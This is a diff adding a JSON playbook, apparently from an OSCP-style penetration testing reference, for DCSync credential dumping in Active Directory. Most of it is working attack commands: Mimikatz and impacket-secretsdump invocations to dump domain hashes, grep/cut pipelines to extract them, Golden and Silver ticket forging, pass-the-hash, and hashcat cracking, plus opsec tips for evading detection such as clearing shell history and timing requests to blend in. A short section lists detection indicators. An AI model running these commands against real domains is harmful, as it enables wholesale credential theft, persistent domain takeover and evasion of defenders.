@@ -1,0 +1,305 @@
+{
+  "name": "DCSync Attack Methodology",
+  "description": "Complete workflow for dumping domain credentials via DRSUAPI replication by impersonating a domain controller. DCSync is the primary post-exploitation technique after obtaining Domain Admin rights.",
+  "category": "active-directory",
+  "subcategory": "credential-dumping",
+  "tags": ["OSCP:HIGH", "ACTIVE_DIRECTORY", "DCSYNC", "CREDENTIAL_DUMPING", "POST_EXPLOITATION", "DOMAIN_ADMIN", "METHODOLOGY"],
+  "phases": [
+    {
+      "phase": "1. Prerequisites",
+      "description": "Verify requirements before attempting DCSync",
+      "steps": [
+        {
+          "step": "1.1 Obtain Domain Admin or Replication Rights",
+          "required_privileges": {
+            "Domain Admin": "Default group with replication rights (most common)",
+            "Enterprise Admin": "Forest-wide admin (multi-domain forests)",
+            "Replication Rights": "DS-Replication-Get-Changes + DS-Replication-Get-Changes-All ACLs on domain object"
+          },
+          "verification": [
+            "crackmapexec smb <dc_ip> -u <user> -p <pass> --groups (look for 'Domain Admins')",
+            "net group \"Domain Admins\" /domain (list DA members)",
+            "Get-DomainObjectAcl -DistinguishedName 'DC=corp,DC=com' -ResolveGUIDs | ? {$_.ObjectAceType -match 'Replication'}"
+          ],
+          "notes": "DCSync REQUIRES Domain Admin or explicit replication ACLs. Local admin on member servers is NOT sufficient. Verify privileges BEFORE attempting to avoid failed DCSync attempts (generates detection logs).",
+          "time_estimate": "<1 minute",
+          "related_commands": ["ad-check-domain-admin", "ad-dcsync-check-permissions"]
+        },
+        {
+          "step": "1.2 Ensure Network Connectivity to DC",
+          "required_ports": {
+            "TCP 135": "RPC Endpoint Mapper (initial connection)",
+            "TCP 49152-65535": "RPC dynamic ports (actual replication communication)",
+            "TCP 445": "SMB (authentication and name resolution)",
+            "TCP 88": "Kerberos (authentication)",
+            "TCP 389": "LDAP (DC discovery)"
+          },
+          "verification": [
+            "ping <dc_ip> (test reachability)",
+            "Test-NetConnection -ComputerName <dc_ip> -Port 135 (test RPC)",
+            "smbclient -L //<dc_ip> -U <domain>/<user>%<pass> (test SMB from Linux)"
+          ],
+          "notes": "DCSync is NETWORK-BASED (no need to log into DC). Must have routing to DC from attack machine. VPN/pivoting setup required if DC not directly reachable from Kali.",
+          "time_estimate": "<1 minute"
+        }
+      ]
+    },
+    {
+      "phase": "2. DCSync Execution",
+      "description": "Extract credentials using DRSUAPI replication",
+      "methods": [
+        {
+          "method": "DCSync Single User (Mimikatz)",
+          "command": "mimikatz # lsadump::dcsync /domain:corp.com /user:krbtgt",
+          "use_cases": "Targeted credential extraction (krbtgt for Golden tickets, specific admin accounts)",
+          "advantages": "Fastest (1-5 seconds), stealthiest (single user replication less suspicious), precise",
+          "output": "NTLM hash, LM hash, Kerberos keys (AES256, AES128, DES), password history",
+          "priority_targets": [
+            "krbtgt (HIGHEST PRIORITY - enables Golden Ticket attacks)",
+            "Administrator (domain admin account, RID 500)",
+            "Specific compromised accounts (for backup access)",
+            "Service accounts with admin rights (for Silver/Golden tickets)"
+          ],
+          "time_estimate": "1-5 seconds per user",
+          "related_commands": ["ad-dcsync-mimikatz-single-user"]
+        },
+        {
+          "method": "DCSync Single User (impacket-secretsdump)",
+          "command": "impacket-secretsdump -just-dc-user krbtgt 'corp.com/administrator:Pass123!@192.168.50.70'",
+          "use_cases": "Linux-based DCSync from Kali (most common in OSCP)",
+          "advantages": "Works from Kali (no Windows needed), no AV/EDR on target, clean output format",
+          "output": "domain\\user:RID:LMhash:NThash::: (machine-parseable)",
+          "notes": "RECOMMENDED for OSCP. Use single quotes around auth string to handle special characters in password. Use -hashes :NTLM for pass-the-hash authentication.",
+          "time_estimate": "2-10 seconds per user",
+          "related_commands": ["ad-dcsync-impacket-secretsdump-user"]
+        },
+        {
+          "method": "DCSync All Users (Full Domain Dump)",
+          "commands": {
+            "Mimikatz": "mimikatz # lsadump::dcsync /domain:corp.com /all /csv",
+            "impacket": "impacket-secretsdump -just-dc-ntlm 'corp.com/administrator:pass@192.168.50.70'"
+          },
+          "use_cases": "Comprehensive domain credential harvest, offline password cracking, complete AD takeover",
+          "advantages": "All domain credentials in one operation, enables offline analysis, complete view of domain",
+          "disadvantages": "Slower (30 seconds to 10 minutes depending on user count), noisier (more Event ID 4662 logs), large output",
+          "notes": "Use -just-dc-ntlm (NTLM only) instead of -just-dc (full dump) for 30-50% speed improvement. For OSCP: Prioritize krbtgt (Golden ticket) over full dump (time management).",
+          "time_estimate": "30-120 seconds (50-200 users typical in OSCP)",
+          "related_commands": ["ad-dcsync-impacket-secretsdump-domain"]
+        }
+      ]
+    },
+    {
+      "phase": "3. Output Parsing and Hash Extraction",
+      "description": "Extract usable credentials from DCSync output",
+      "parsing_methods": {
+        "Mimikatz Output Format": {
+          "example": "Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e\nntlm- 0: 2892d26cdf84d7a70e2eb3b9f05c425e (current)\nntlm- 1: a11e808659d5ec5b6c4f43c1e5a0972d (history)",
+          "extract_ntlm": "Look for 'Hash NTLM:' line OR 'ntlm- 0:' (current hash)",
+          "extract_aes256": "Look for 'aes256-cts-hmac-sha1-96:' line (64 hex chars)",
+          "notes": "Mimikatz output is verbose. Focus on 'Hash NTLM' for most use cases (PTH, Golden/Silver tickets). AES keys needed only for advanced Kerberos attacks."
+        },
+        "impacket-secretsdump Output Format": {
+          "example": "corp\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::",
+          "format_breakdown": {
+            "field_1": "Domain\\Username (corp\\Administrator)",
+            "field_2": "RID (500 = Domain Administrator, 502 = krbtgt, 1000+ = custom users)",
+            "field_3": "LM hash (aad3b435b51404eeaad3b435b51404ee = empty LM, ignore)",
+            "field_4": "**NTLM hash** (2892d26cdf84d7a70e2eb3b9f05c425e) ← THIS IS WHAT YOU NEED",
+            "field_5-7": "Empty fields (unused)"
+          },
+          "extract_ntlm": "cut -d ':' -f 4 (extracts 4th field = NTLM hash)",
+          "automated_extraction": "impacket-secretsdump -just-dc-user Administrator 'corp.com/admin:pass@192.168.50.70' | grep ':500:' | cut -d ':' -f 4 > admin_hash.txt",
+          "notes": "impacket output is clean and machine-parseable. Pipe to grep/cut/awk for automated hash extraction. Kerberos keys listed separately (if using -just-dc instead of -just-dc-ntlm)."
+        }
+      },
+      "hash_storage": {
+        "credential_file": "echo 'Administrator:2892d26cdf84d7a70e2eb3b9f05c425e' >> creds.txt\necho 'krbtgt:4d28cf5252d39971419580a51484ca09' >> creds.txt",
+        "notes": "Maintain a credential collection file (creds.txt) with format username:ntlm_hash. Use for pass-the-hash, Golden tickets, or offline cracking. Store securely and back up off target network.",
+        "priority_hashes": [
+          "krbtgt (Golden Ticket enabler - HIGHEST VALUE)",
+          "Domain admin accounts (Administrator, DA members)",
+          "Service accounts with high privileges (for Silver tickets)",
+          "Your compromised account (backup access if primary creds lost)"
+        ]
+      }
+    },
+    {
+      "phase": "4. Credential Usage",
+      "description": "Leverage dumped credentials for continued access and escalation",
+      "usage_paths": [
+        {
+          "path": "Golden Ticket Creation (krbtgt hash)",
+          "workflow": [
+            "1. DCSync krbtgt: impacket-secretsdump -just-dc-user krbtgt 'corp.com/admin:pass@192.168.50.70'",
+            "2. Extract krbtgt NTLM hash: grep ':502:' output | cut -d ':' -f 4 → 4d28cf5252d39971419580a51484ca09",
+            "3. Get Domain SID: whoami /user (remove RID) → S-1-5-21-1987370270-658905905-1781884369",
+            "4. Create Golden Ticket: impacket-ticketer -nthash 4d28cf5252d39971419580a51484ca09 -domain corp.com -domain-sid S-1-5-21-XXX -user-id 500 fakeadmin",
+            "5. Use ticket: export KRB5CCNAME=fakeadmin.ccache && impacket-wmiexec -k -no-pass corp.com/fakeadmin@DC1.corp.com"
+          ],
+          "result": "Domain-wide persistent access for 10 years. Ticket grants access to ANY service in domain. Bypasses password changes (until krbtgt password rotated, rare).",
+          "time_estimate": "2-5 minutes (DCSync to Golden ticket ready)",
+          "related_commands": ["ad-golden-ticket-mimikatz-create"]
+        },
+        {
+          "path": "Pass-the-Hash (NTLM hash)",
+          "workflow": [
+            "1. DCSync target account: impacket-secretsdump -just-dc-user administrator 'corp.com/admin:pass@192.168.50.70'",
+            "2. Extract NTLM hash: grep ':500:' output | cut -d ':' -f 4 → 2892d26cdf84d7a70e2eb3b9f05c425e",
+            "3. Pass-the-hash: impacket-wmiexec -hashes :2892d26cdf84d7a70e2eb3b9f05c425e corp.com/Administrator@192.168.50.80"
+          ],
+          "result": "Remote code execution on target machine. Use for lateral movement, privilege escalation, or accessing resources without cracking password.",
+          "time_estimate": "1-2 minutes",
+          "related_commands": ["crackmapexec-smb-pth"]
+        },
+        {
+          "path": "Offline Password Cracking",
+          "workflow": [
+            "1. DCSync all users: impacket-secretsdump -just-dc-ntlm 'corp.com/admin:pass@192.168.50.70' > domain_hashes.txt",
+            "2. Extract NTLM hashes: grep ':::' domain_hashes.txt | cut -d ':' -f 4 > ntlm_hashes.txt",
+            "3. Crack with Hashcat: hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
+            "4. View cracked: hashcat -m 1000 ntlm_hashes.txt --show"
+          ],
+          "result": "Plaintext passwords for accounts with weak/common passwords. Use for legitimate authentication (stealthier than PTH), password pattern analysis, or accessing services that don't support PTH.",
+          "time_estimate": "5 minutes to several hours (depends on password complexity, run in background)",
+          "notes": "Start cracking immediately after DCSync but don't wait for results. Use hashes directly with PTH while cracking runs in background.",
+          "related_commands": ["hashcat-crack-ntlm"]
+        },
+        {
+          "path": "Silver Ticket Creation (service account hashes)",
+          "workflow": [
+            "1. Identify service accounts: Get-NetUser -SPN | Select samaccountname,serviceprincipalname",
+            "2. DCSync service account: impacket-secretsdump -just-dc-user iis_service 'corp.com/admin:pass@192.168.50.70'",
+            "3. Extract hash: grep 'iis_service' output | cut -d ':' -f 4 → service_account_ntlm",
+            "4. Create Silver ticket: mimikatz # kerberos::golden /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:http /rc4:service_account_ntlm /user:admin /ptt"
+          ],
+          "result": "Service-specific persistent access (10 years). Stealthier than Golden ticket (service-level, not domain-wide). Use for accessing specific high-value services (IIS, SQL Server, file shares).",
+          "time_estimate": "5-10 minutes",
+          "related_commands": ["ad-silver-ticket-mimikatz-create"]
+        }
+      ]
+    }
+  ],
+  "dcsync_vs_alternatives": {
+    "DCSync vs NTDS.dit Extraction": {
+      "dcsync": {
+        "privilege": "Domain Admin (or replication rights)",
+        "access": "Remote (no DC access needed)",
+        "method": "Network-based DRSUAPI replication",
+        "speed": "Fast (1-5 sec per user, 30-120 sec full domain)",
+        "forensics": "Event ID 4662 on DC (replication request), no file artifacts",
+        "stealth": "Appears as normal replication traffic, harder to detect"
+      },
+      "ntds_extraction": {
+        "privilege": "Local Administrator on DC",
+        "access": "Local (must access DC file system)",
+        "method": "VSS snapshot + file copy + offline parsing",
+        "speed": "Slower (5-30 minutes including transfer)",
+        "forensics": "Event ID 8222 (VSS creation), file access logs, large file transfer",
+        "stealth": "More forensic artifacts (file copy, disk access)"
+      },
+      "when_to_use_dcsync": "Have Domain Admin, want remote operation, need speed, prefer stealth, working from Kali",
+      "when_to_use_ntds": "Have local admin on DC (not DA), DCSync is detected/blocked, want offline analysis, analyzing backup files"
+    },
+    "DCSync vs Mimikatz LSASS Dump": {
+      "dcsync": "Dumps ALL domain credentials remotely. Use AFTER obtaining Domain Admin. Provides complete domain view.",
+      "lsass_dump": "Dumps credentials of currently logged-on users only. Use for local privilege escalation or lateral movement. Limited to active sessions.",
+      "comparison": "DCSync is comprehensive (all domain accounts), LSASS dump is opportunistic (only logged-on users). DCSync requires DA, LSASS requires local admin."
+    },
+    "DCSync vs Kerberoasting": {
+      "dcsync": "Post-exploitation with Domain Admin. Direct hash extraction (no cracking needed). Gets all accounts including non-SPN accounts.",
+      "kerberoasting": "Pre-compromise technique. Requires cracking TGS-REP. Only works on accounts with SPNs.",
+      "relationship": "Complementary, not alternatives. Kerberoasting helps GET domain admin (crack service account with admin rights). DCSync is what you do AFTER obtaining domain admin (dump everything)."
+    }
+  },
+  "common_issues": {
+    "RemoteOperations failed / DCERPC Runtime Error": {
+      "cause": "User lacks Domain Admin or replication rights",
+      "verification": "crackmapexec smb <dc_ip> -u <user> -p <pass> --groups (check for 'Domain Admins')",
+      "solution": "Use DA account OR check ACLs for custom replication rights. If local admin on DC but not DA, use NTDS.dit extraction instead.",
+      "prevention": "Always verify DA membership BEFORE attempting DCSync. Test with: net group \"Domain Admins\" /domain"
+    },
+    "Connection timeout / RPC server unavailable": {
+      "cause": "Network connectivity issue or firewall blocking RPC ports",
+      "verification": "Test RPC: nc -zv <dc_ip> 135, Test SMB: smbclient -L //<dc_ip>, Check routing: ip route get <dc_ip>",
+      "solution": "Verify VPN/network, check firewall rules, try alternative DC, use FQDN instead of IP",
+      "prevention": "Test network connectivity to DC before attempting DCSync. Ensure RPC ports (135 + ephemeral high ports) are allowed."
+    },
+    "Special characters in password breaking auth (impacket)": {
+      "cause": "Bash interprets special characters (!, $, `, etc.) in password",
+      "solution": "Use SINGLE QUOTES: 'corp.com/admin:P@ssw0rd!@192.168.50.70' OR use -hashes :NTLM (pass-the-hash)",
+      "prevention": "Always quote auth string. If password has single quote, use -hashes instead."
+    },
+    "User '<user>' not found": {
+      "cause": "Target username typo or user doesn't exist",
+      "verification": "Get-ADUser -Identity <username> OR net user <username> /domain",
+      "solution": "Verify spelling (case-insensitive but must be exact). For computer accounts, append $ (DC1$)",
+      "prevention": "List domain users first: Get-NetUser | Select samaccountname, then use exact spelling."
+    }
+  },
+  "time_budget_oscp": {
+    "prerequisite_verification": "1 minute (check DA membership, test DC connectivity)",
+    "dcsync_single_user_krbtgt": "5-10 seconds (fastest, most critical)",
+    "dcsync_full_domain": "30-120 seconds (depends on user count)",
+    "hash_extraction_and_storage": "1-2 minutes (parse output, store in creds.txt)",
+    "golden_ticket_creation": "2-5 minutes (from krbtgt hash to working Golden ticket)",
+    "total_da_to_golden_ticket": "5-10 minutes (end-to-end)",
+    "total_da_to_full_domain_dump": "3-5 minutes (all credentials harvested)"
+  },
+  "detection_and_opsec": {
+    "blue_team_indicators": [
+      "Event ID 4662 on DC: 'An operation was performed on an object' with replication GUIDs (1131f6aa-9c07-11d1-f79f-00c04fc2dcd2, 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)",
+      "Replication request from non-DC machine (source IP is workstation/server, not DC IP)",
+      "User account performing replication (not MACHINE$ computer account)",
+      "Single object replication (unusual - legitimate DC replication is partition-wide)",
+      "Replication outside normal schedule (if environment has scheduled replication windows)"
+    ],
+    "opsec_improvements": [
+      "Use -just-dc-user (targeted) instead of -just-dc (full dump) - fewer logs, faster",
+      "Space out requests if dumping multiple users (don't hammer DC with 100 requests in 10 seconds)",
+      "Perform during business hours (appears as normal admin activity)",
+      "Use compromised DC computer account if available (MACHINE$ appears more legitimate)",
+      "Clear command history after: history -c OR HISTFILE=/dev/null before running"
+    ],
+    "detection_difficulty": "DCSync is HARDER to detect than NTDS.dit extraction because it appears as normal AD replication traffic. Event ID 4662 is common (generated for many AD operations), making DCSync blend in. NTDS.dit extraction has obvious forensic artifacts (VSS snapshot, large file transfer)."
+  },
+  "oscp_exam_tips": [
+    "ALWAYS DCSync krbtgt FIRST (Golden Ticket is highest value persistence)",
+    "Create credential collection file immediately: echo 'krbtgt:HASH' >> creds.txt",
+    "Validate DA membership BEFORE attempting DCSync (avoid failed attempts, detection)",
+    "Use impacket-secretsdump from Kali (no AV/EDR on target, clean output)",
+    "Single quotes around auth string to handle special characters in password",
+    "Start hash cracking in background immediately but don't wait for results (use hashes with PTH)",
+    "Test DCSync on one user first (krbtgt) to verify permissions before full domain dump",
+    "If DCSync takes >2 minutes, cancel and try alternative method (time management)",
+    "Document all hashes immediately (network may drop, can't re-run easily)",
+    "Golden Ticket creation should be IMMEDIATE next step after krbtgt dump"
+  ],
+  "workflow_summary": {
+    "quick_reference": [
+      "1. Verify DA: crackmapexec smb <dc_ip> -u <user> -p <pass> --groups",
+      "2. DCSync krbtgt: impacket-secretsdump -just-dc-user krbtgt 'corp.com/admin:pass@dc_ip'",
+      "3. Extract hash: grep ':502:' output | cut -d ':' -f 4 → krbtgt_ntlm",
+      "4. Get Domain SID: whoami /user → S-1-5-21-XXX (remove RID)",
+      "5. Golden Ticket: impacket-ticketer -nthash <krbtgt_ntlm> -domain corp.com -domain-sid S-1-5-21-XXX fakeadmin",
+      "6. Use ticket: export KRB5CCNAME=fakeadmin.ccache && impacket-wmiexec -k -no-pass corp.com/fakeadmin@DC1.corp.com",
+      "TOTAL TIME: <10 minutes from DA to domain-wide persistent access"
+    ]
+  },
+  "related_commands": [
+    "ad-check-domain-admin",
+    "ad-dcsync-check-permissions",
+    "ad-dcsync-mimikatz-single-user",
+    "ad-dcsync-impacket-secretsdump-user",
+    "ad-dcsync-impacket-secretsdump-domain",
+    "ad-golden-ticket-mimikatz-create",
+    "crackmapexec-smb-pth",
+    "hashcat-crack-ntlm"
+  ],
+  "references": [
+    "Mimikatz DCSync: https://github.com/gentilkiwi/mimikatz/wiki/module~lsadump#dcsync",
+    "impacket secretsdump: https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py",
+    "Sean Metcalf's DCSync research: https://adsecurity.org/?p=1729",
+    "Microsoft MS-DRSR Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/",
+    "MITRE ATT&CK T1003.006: https://attack.mitre.org/techniques/T1003/006/"
+  ]
+}
